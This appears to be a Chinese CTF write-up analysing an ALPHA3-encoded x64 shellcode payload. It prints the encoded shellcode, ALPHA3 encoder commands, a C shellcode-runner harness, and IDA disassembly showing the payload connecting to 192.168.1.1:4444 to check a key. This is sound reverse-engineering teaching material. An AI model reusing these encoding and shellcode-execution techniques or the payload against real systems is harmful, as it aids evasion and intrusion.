#1day

450<br>
IPS发现并捕获到了一个1day漏洞的利用，还好有防御措施，系统未被攻陷。请你帮danny后续分析一下这次漏洞利用的payload，分析并找到它的验证密钥。<br>

这个是个挺好玩的题目。<br>
给的是一段字符：<br>

    Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103
    l0y4q3J3d8O4F8K095N0O3L5k3W4p1L3m3O8m018M4T3l0E4V1K1M0m0L1K0z8L4
    O8N4s3A4Y5l1P0e5M4I8K3T3p3g3B0g8O8P3119120z3Y1p0G0n7p2m2t2Z1M034
    N4Y8M4A3N0R4U4u8O7O370e4p1o4B0X0c3E3c2p3s303M0f0x3F3R2r4Z3v8o0V0
    E7k0l0K2z2D190T123D4o7L4G5K2z0v4I3Z3R4B3J3c38175M313a5p3y3a4X114
    O394o4F3C3g4W184W343c4A2r0g3e05313M4n0l4V2w0l4J3R4Q3G153V4x4l0S0
    q2t0V0D4z3D3R020P3G3v163Y4z3a1p1N3E40113P304U1n0a3G3t193r304y0V3
    m0V300a8P5N8M3f3L4u3Y2D8M4r4P3g4I4u3B2E5o314N3b3O4r3V7p3z5K4B0U0
    I3E3p1M3n3D2t0x374U402n7N4X3q0b031p8M8M3P40364K4o8O0H2z0H3p3V054
    l3H2n2u4r3v2F7M4q4O7K2j2q2D2I2w324P4J19134A0b4K4U4W3c0G0T174I5O3
    U4u4t3o3g4H4q0G0r4Y3O0A4O0V4u2u4p4U1K2B4o3c3g0w5p0Y3R0u0O4R0S0d4
    Y7L5K0D2C7N2M3q3z7L320e4W0m2v8l5L4W3X8N0q7l2Z024B4P8L8K8L3g5L0T7
    L8L3v040h144k4x4P4t4v8O8M403r4M4p8L3L0E113p0A4n3L3f12124O361N4G4
    M4Q3t2n094C3D141M0E8K4B4S4Z0c3Y0Q023D0F4U4W1n0q333K1K2y4p335l5N0
    k0m153R0h2L370A3n7N330d4A0m5N1m083l08084V3C3D0w4Q1o4J8K060b8l054
    v3D0j144T5l0h3m8L7K2G4y0a4Q3A3j3X7L5n0b4n4V1N0t3Z3K0W4M3F2L2H4q1
    M0n340w0j4j3b194y8m3w0u1k0Y3J2F3b7O5M0U3f4W2v3c4F1k5M1o2q383R123
    23t0m144F7M365N2o2K3V0A4k5l1k3l3g7K5N0G0W15315M0p0l2k2k2E0I3V335
    O4S3U2o1P4H3V1L053s4s2m0a00360o3Y3X2Z4M1p5k0x0n4s4Y5M8L3q3b4A1M0
    43p3I1n3K4R4E0t3G3J1n4j4n4v325N4q4t4U0E4k3C5K4y0B3H0x174N5k1K0e4
    Q3N0L134Y5n0v404p2w2L0A4v3D4D7m4C3C5m193Z4W3S1O2M4C4E8N2j3C1L013
    74Q2E0N3o3D8N4q0d3u7p2o2q3D8L100p3J124n4s4T3u4E7N3D0R4Z3j3d4G4x8
    N5M3F117O3B0u3b3H4V4W4L4I8l4k7l2p0Q3l0B2x2r2v2Z0p8P164L3L2K2j0A0
    Z3L0k0N4M5n0a0k323H4E5m400V8l075o3p5M102j0m0n054B4Y4M093i4V353y3
    S4l360Y360Y5m8M0G0n1L0w3K2K5n5L8n4Q4U0E0e5l0K3N3Y2N3U0A3m2K4q0x0
    E0P3f4y2t4n18023e1M0Q0A8o4R3N3e3T5n3W5K0W4R3H1P373w7o388K2L138N7
    M4T0c0G0O4U4U103o3m374G8N3F3a0q2q8P3w170a5m3a0y5L0S4B0B0a4V4Z4C4
    L8L0w0A2C5n3X402J4P3C4E3i1n4v2v3c3I0x2J4S3x304y4s4u4V197K2s3K0u3
    u3A4A2z2B03
然后，一看就知道是alpha3处理过的字符数字shellcode。<br>
于是找出alpha3，生成了多生成了几个模板：<br>

    python ALPHA3.py x86 ascii mixedcase EAX --input=ALPHA3.cmd
    hffffk4diFkTpj02Tpk0T0AuEE150A0L0D2I1o2B2p0a0L2M0A11120l0B192p0D2z0L
    python ALPHA3.py x86 ascii mixedcase EBX --input=ALPHA3.cmd
    hffffk4diFkDsj02Dsk0D3AuEE150A0L0D2I1o2B2p0a0L2M0A11120l0B192p0D2z0L
    python ALPHA3.py x86 ascii mixedcase EcX --input=ALPHA3.cmd
    hffffk4diFkDqj02Dqk0D1AuEE150A0L0D2I1o2B2p0a0L2M0A11120l0B192p0D2z0L
    python ALPHA3.py x86 ascii mixedcase EDX --input=ALPHA3.cmd
    hffffk4diFkDrj02Drk0D2AuEE150A0L0D2I1o2B2p0a0L2M0A11120l0B192p0D2z0L
    python ALPHA3.py x86 ascii mixedcase EDI --input=ALPHA3.cmd
    hffffk4diFkDwj02Dwk0D7AuEE150A0L0D2I1o2B2p0a0L2M0A11120l0B192p0D2z0L
    python ALPHA3.py x86 ascii mixedcase ESI --input=ALPHA3.cmd
    VYhffffk4diFkDql02Dqm0D1CuEE150A0L0D2I1o2B2p0a0L2M0A11120l0B192p0D2z0L
    python ALPHA3.py x86 ascii mixedcase ESP --input=ALPHA3.cmd
    TYhffffk4diFkDql02Dqm0D1CuEE150A0L0D2I1o2B2p0a0L2M0A11120l0B192p0D2z0L
    python ALPHA3.py x86 ascii mixedcase EBP --input=ALPHA3.cmd
    hffffk4diFkDuj02Duk0D5AuEE150A0L0D2I1o2B2p0a0L2M0A11120l0B192p0D2z0L
    
    python ALPHA3.py x64 ascii mixedcase RAX --input=ALPHA3.cmd
    Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2m0B2t0D2J1m2z2p0a0L2N0A13120T0B192p0D2z0L
    python ALPHA3.py x64 ascii mixedcase RBX --input=ALPHA3.cmd
    Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2m0B2t0D2J1m2z2p0a0L2N0A13120T0B192p0D2z0L
    python ALPHA3.py x64 ascii mixedcase RCX --input=ALPHA3.cmd
    Qh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2m0B2t0D2J1m2z2p0a0L2N0A13120T0B192p0D2z0L
    python ALPHA3.py x64 ascii mixedcase RDX --input=ALPHA3.cmd
    Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2m0B2t0D2J1m2z2p0a0L2N0A13120T0B192p0D2z0L
    python ALPHA3.py x64 ascii mixedcase RSP --input=ALPHA3.cmd
    Th0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2m0B2t0D2J1m2z2p0a0L2N0A13120T0B192p0D2z0L
    python ALPHA3.py x64 ascii mixedcase RBP --input=ALPHA3.cmd
    Uh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2m0B2t0D2J1m2z2p0a0L2N0A13120T0B192p0D2z0L

于是就能发现，给我们的那段，其实就是一个shellcode，运行条件还必须是RAX指向它，而且，是64位平台上运行的。<br>

so，知道了这些信息后，就得想办法让它运行起来。<br>
一般shellcode是在堆栈区的，而且呢，因为它是加密过的shellcode，直接静态分析显然是不可取的，而且在解密的过程中，它会写自身。<br>
那怎么办？首先只能动态调试了，其次，为了方便调试而不是每次都去改堆栈内容，改eip等，最好的办法就是，写个x64的程序，并设置code段为可写可读。<br>
最好是把地址随机化之类的防护全部关了。<br>

生成好程序之后，找到入口点，并从程序入口点开始用shellcode替换等长度的原本程序的内容。<br>
因为在运行shellcode前，rax必须指向shellcode，而且地址随机化已经关闭，所以，在shellcode前加入一句：<br>
    mov rax,0x000000014000100a<br>
汇编后为：<br>
    pwn.asm("mov rax, 0x14000100a", arch='amd64')<br>
    'H\xb8\n\x10\x00@\x01\x00\x00\x00'<br>
占十个字节，所以，shellcode从0x000000014000100a开始的。再在shellcode后删除原本的code段10字节，保证程序大小不变，并且各区段位置不变。<br>
这样，就能够直接运行程序了，后来跟天意聊天的时候，发现tm自己当时sb了。
调试shellcode不应该直接：

    char code[] = "paste your shellcode here";
    
    int main(int argc, char **argv)
    {
    int (*func)();
    func = (int (*)()) code;
    (int)(*func)();
    }

只要在shellcode前加上两句汇编，比如：lea rax,code，就能够达到使rax指向shellcode，并且不用考虑可写的问题。<br>
在动态调试的过程中，发现，似乎shellcode做了反调试。到第一个获取基址的地方就过不去了。<br>
但是通过上面对shellcode的解码还是能看到不少信息。<br>
比如192.168.1.1，ws2_32.dll，Hi!，Done!，cngratulation等等。<br>
然后，猜测程序要访问192.168.1.1。<br>
于是在运行程序的同时，netstat -an | find "192.168.1.1"<br>
发现他尝试连接到192.168.1.1的4444端口。<br>
知道这些了，对我们来说已经非常不错了。<br>
把虚拟机的虚拟网卡设置为192.168.1.1，或者自身设置也行。<br>
然后：<br>
nc -l -p 4444 -vv<br>
再运行程序，发现能收到Hi!<br>
但是，还是无法理解程序。怎么办呢？<br>
这里用到第一个内存dump的思路。<br>
在windbg里，执行到00000001`4000112c e84a010000 call image00000001_40000000+0x127b时，把内存dump出来。<br>

    .writemem c:\dump.dmp 0000000140000000 0000000140010200
为什么是写这些呢？因为0000000140000000是mz，然后我dump和exe同样大小的内存。虽然dump出来的不会是一个能够运行的exe，但是对我们来说足够了。<br>
因为这次dump，其实也只是为了看一下解密后的代码。直接用任务管理器的dump，会出现一种情况，就是，数据量太多，不便分析。<br>

把dump出来的程序放到ida里，通过winhex等的合作，找到我们调试不下去的地方。<br>
然后静态分析，整个shellcode，功能段如下：<br>

    .text:0000000140001C8E                 lea     rdx, [rsp+30h]
    .text:0000000140001C93                 lea     ecx, [rax+68h]
    .text:0000000140001C96                 mov     dword ptr [rsp+50h], '_2sw'
    .text:0000000140001C9E                 mov     dword ptr [rsp+54h], 'd.23'
    .text:0000000140001CA6                 rep stosb
    .text:0000000140001CA8                 mov     ecx, 0FFFB8C06h
    .text:0000000140001CAD                 mov     word ptr [rsp+58h], 'll'
    .text:0000000140001CB4                 mov     byte ptr [rsp+5Ah], 0
    .text:0000000140001CB9                 mov     dword ptr [rsp+60h], '.291'
    .text:0000000140001CC1                 mov     dword ptr [rsp+64h], '.861'
    .text:0000000140001CC9                 mov     dword ptr [rsp+68h], '1.1'
    .text:0000000140001CD1                 mov     dword ptr [rbp+1B0h], '!iH'
    .text:0000000140001CDB                 mov     dword ptr [rbp+1B8h], 'enoD'
    .text:0000000140001CE5                 mov     word ptr [rbp+1BCh], '!'
    .text:0000000140001CEE                 mov     dword ptr [rsp+40h], 'rgnc'
    .text:0000000140001CF6                 mov     dword ptr [rsp+44h], 'luta'
    .text:0000000140001CFE                 mov     dword ptr [rsp+48h], 'oita'
    .text:0000000140001D06                 mov     word ptr [rsp+4Ch], 'n'
    .text:0000000140001D0D                 mov     dword ptr [rsp+30h], 'rgnc'
    .text:0000000140001D15                 mov     dword ptr [rsp+34h], 'luta'
    .text:0000000140001D1D                 mov     dword ptr [rsp+38h], 'oita'
    .text:0000000140001D25                 mov     word ptr [rsp+3Ch], 'n'
    .text:0000000140001D2C                 call    get_func_addr
    .text:0000000140001D31                 lea     rcx, [rsp+50h]  ; ws2_32.dll
    .text:0000000140001D36                 call    rax             ; loadlibrary()
    .text:0000000140001D38                 lea     rdx, [rsp+31h]
    .text:0000000140001D3D                 mov     ecx, 5C8A5B3Ah
    .text:0000000140001D42                 call    get_func_addr
    .text:0000000140001D47                 lea     rdx, [rsp+32h]
    .text:0000000140001D4C                 mov     ecx, 4011469352
    .text:0000000140001D51                 mov     r14, rax
    .text:0000000140001D54                 call    get_func_addr
    .text:0000000140001D59                 lea     rdx, [rbp-10h]
    .text:0000000140001D5D                 mov     ecx, 202h
    .text:0000000140001D62                 call    rax             ; socket()
    .text:0000000140001D64                 lea     rdx, [rsp+33h]
    .text:0000000140001D69                 mov     ecx, 725A5C1Fh
    .text:0000000140001D6E                 call    get_func_addr
    .text:0000000140001D73                 and     dword ptr [rsp+28h], 0
    .text:0000000140001D78                 and     dword ptr [rsp+20h], 0
    .text:0000000140001D7D                 xor     r9d, r9d
    .text:0000000140001D80                 xor     r8d, r8d
    .text:0000000140001D83                 lea     edx, [r9+1]
    .text:0000000140001D87                 lea     ebx, [rdx+1]
    .text:0000000140001D8A                 mov     ecx, ebx
    .text:0000000140001D8C                 call    rax             ; socket()
    .text:0000000140001D8E                 lea     rdx, [rsp+34h]
    .text:0000000140001D93                 mov     ecx, 61ADEF4h
    .text:0000000140001D98                 mov     rdi, rax        ; rdi = socket
    .text:0000000140001D9B                 call    get_func_addr
    .text:0000000140001DA0                 lea     rcx, [rsp+60h]  ; 192.168.1.1
    .text:0000000140001DA5                 mov     [rsp+70h], bx
    .text:0000000140001DAA                 call    rax             ; inet_addr()
    .text:0000000140001DAC                 lea     rdx, [rsp+35h]
    .text:0000000140001DB1                 mov     [rsp+74h], eax
    .text:0000000140001DB5                 mov     eax, 5C11h      ; 4444
    .text:0000000140001DBA                 mov     ecx, 5C9CA034h
    .text:0000000140001DBF                 mov     [rsp+72h], ax
    .text:0000000140001DC4                 call    get_func_addr
    .text:0000000140001DC9                 lea     rdx, [rsp+36h]
    .text:0000000140001DCE                 mov     ecx, 1ACF18D4h
    .text:0000000140001DD3                 mov     rsi, rax
    .text:0000000140001DD6                 call    get_func_addr
    .text:0000000140001DDB                 lea     r8d, [rbx+0Eh]  ; len
    .text:0000000140001DDF                 lea     rdx, [rsp+70h]  ; addr
    .text:0000000140001DE4                 mov     rcx, rdi        ; socket
    .text:0000000140001DE7                 call    rax             ; connect()
    .text:0000000140001DE9                 cmp     eax, 0FFFFFFFFh
    .text:0000000140001DEC                 jz      short loc_140001E61
    .text:0000000140001DEE                 lea     rdx, [rsp+37h]
    .text:0000000140001DF3                 mov     ecx, 6E826829h
    .text:0000000140001DF8                 call    get_func_addr
    .text:0000000140001DFD                 xor     r9d, r9d        ; 0
    .text:0000000140001E00                 lea     rdx, [rbp+1B0h] ; buf = Hi!
    .text:0000000140001E07                 lea     r8d, [r9+4]     ; len = 4
    .text:0000000140001E0B                 mov     rcx, rdi        ; socket
    .text:0000000140001E0E                 mov     rbx, rax
    .text:0000000140001E11                 call    rsi             ; send()
    .text:0000000140001E13                 xor     r9d, r9d        ; 0
    .text:0000000140001E16                 lea     rdx, [rsp+40h]  ; buf = 12fcb0
    .text:0000000140001E1B                 lea     r8d, [r9+14]    ; len = 14
    .text:0000000140001E1F                 mov     rcx, rdi        ; socket
    .text:0000000140001E22                 call    r14             ; Recv()
    .text:0000000140001E25                 cmp     eax, 0FFFFFFFFh ; No Error!
    .text:0000000140001E28                 jz      short exit      ; socket
    .text:0000000140001E2A                 cmp     byte ptr [rsp+30h], 0
    .text:0000000140001E2F                 jz      short loc_140001E49
    .text:0000000140001E31                 xor     edx, edx        ; rdx=0
    .text:0000000140001E33
    .text:0000000140001E33 loc_140001E33:                          ; CODE XREF: .text:0000000140001E47j
    .text:0000000140001E33                 mov     cl, [rsp+rdx+30h] ; cngratulation
    .text:0000000140001E37                 mov     al, [rsp+rdx+40h]
    .text:0000000140001E3B                 inc     rdx
    .text:0000000140001E3E                 cmp     cl, al
    .text:0000000140001E40                 jnz     short exit      ; socket
    .text:0000000140001E42                 cmp     byte ptr [rsp+rdx+30h], 0
    .text:0000000140001E47                 jnz     short loc_140001E33 ; cngratulation
    .text:0000000140001E49
    .text:0000000140001E49 loc_140001E49:                          ; CODE XREF: .text:0000000140001E2Fj
    .text:0000000140001E49                 xor     r9d, r9d
    .text:0000000140001E4C                 lea     rdx, [rbp+1B8h] ; Done!
    .text:0000000140001E53                 mov     rcx, rdi        ; socket
    .text:0000000140001E56                 lea     r8d, [r9+6]     ; len = 6
    .text:0000000140001E5A                 call    rsi             ; Send()
    .text:0000000140001E5C
    .text:0000000140001E5C ; =============== S U B R O U T I N E =======================================
    .text:0000000140001E5C
    .text:0000000140001E5C ; socket
    .text:0000000140001E5C ; Attributes: noreturn
    .text:0000000140001E5C
    .text:0000000140001E5C ; void __cdecl exit(int Code)
    .text:0000000140001E5C exit            proc near               ; CODE XREF: .text:0000000140001E28j
    .text:0000000140001E5C                                         ; .text:0000000140001E40j
    .text:0000000140001E5C
    .text:0000000140001E5C arg_288         = byte ptr  290h
    .text:0000000140001E5C
    .text:0000000140001E5C                 mov     rcx, rdi
    .text:0000000140001E5F ; 5:   v1();
    .text:0000000140001E5F                 call    rbx             ; close()
    .text:0000000140001E61
    .text:0000000140001E61 loc_140001E61:                          ; CODE XREF: .text:0000000140001DECj
    .text:0000000140001E61                 lea     r11, [rsp+arg_288]
    .text:0000000140001E69                 mov     rbx, [r11+30h]
    .text:0000000140001E6D                 mov     rsi, [r11+38h]
    .text:0000000140001E71                 mov     rsp, r11
    .text:0000000140001E74                 pop     r14
    .text:0000000140001E78                 retn

然后，问题来了，首先我们可以清除的知道，最后是对比[rsp+40h]与[rsp+30h]，而这两段在刚开始赋值的时候都是"cngratulation"。<br>
然后[rsp+40h]中的内容是recv过来的。那，关键的问题是[rsp+30h]中的值是否发生过改变？如果是，在哪发生的改变。<br>
看了半天，似乎，也没其他地方改了它，倒是每次都会传入到get_func_addr()中。get_func_addr()接收两个参数，第一个参数放到rcx，第二个放到rdx。<br>
我们发现，程序每次调用时都传入了[rsp+30h]-[rsp+3Eh]之间的地址。<br>
那，跟进函数get_func_addr(a1, a2)：<br>
    
      *(_BYTE *)a2 = *(_BYTE *)v18;
      *(_DWORD *)(a2 + 1) = 'SlO2';
      *(_BYTE *)(a2 + 5) = 0;

的确有赋值过程。<br>
问题又来了，怎么找到最后的值。首先我们不可能跟着他去算。<br>
两种方法吧，第一个是还原出c代码，跟着算一遍。<br>
第二个就是我用的方法。<br>
这是第二次dump内存，因为当时想的是，在程序等待recv()的过程中，他的确是执行完了所有的get_func_addr()。<br>
此时内存中应该计算好了[rsp+30h]中的值。而且，这个时候，我们并没有输入值，[rsp+40h]中存放的"cngratulation"。将不会被改变。<br>
如果此时dump内存搜索"cngratulation"，就可以直接把要输入的密钥找出来。<br>
![tel](/home/tracy/PycharmProjects/ISCC/DATA/PWN03/result.jpg)

最后得到Flag:LrWWiscc2OlS<br>
